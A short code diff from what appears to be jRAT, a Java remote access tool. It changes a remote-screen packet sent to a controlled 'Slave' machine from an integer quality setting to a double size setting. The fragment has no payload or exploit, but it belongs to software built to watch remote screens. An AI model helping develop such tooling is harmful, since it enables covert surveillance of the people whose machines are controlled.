@@ -7,13 +7,13 @@ import pro.jrat.Slave;
 
 public class Packet12RemoteScreen extends AbstractOutgoingPacket {
 	
-	private int quality;
+	private double size;
 	private int monitor;
 	private int rows;
 	private int cols;
 
-	public Packet12RemoteScreen(int quality, int monitor, int rows, int cols) {
-		this.quality = quality;
+	public Packet12RemoteScreen(double size, int monitor, int rows, int cols) {
+		this.size = size;
 		this.monitor = monitor;
 		this.rows = rows;
 		this.cols = cols;
@@ -21,7 +21,7 @@ public class Packet12RemoteScreen extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(Slave slave, DataOutputStream dos) throws Exception {
-		dos.writeInt(quality);
+		dos.writeDouble(size);
 		dos.writeInt(monitor);
 		dos.writeInt(rows);
 		dos.writeInt(cols);
